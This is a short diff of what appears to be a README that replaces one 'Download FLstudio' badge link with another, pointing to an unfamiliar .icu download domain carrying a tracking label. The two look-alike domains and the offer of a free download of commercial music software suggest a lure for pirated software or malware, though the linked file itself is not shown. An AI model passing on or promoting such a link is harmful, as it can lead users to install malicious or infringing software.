@@ -1,5 +1,4 @@
-[![Download FLstudio](https://img.shields.io/badge/Download-FLstudio%20-blueviolet)](https://downeefiles.com/s/fst)
-
+[![Download FLstudio](https://img.shields.io/badge/Download-FLstudio%20-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
 
 
 
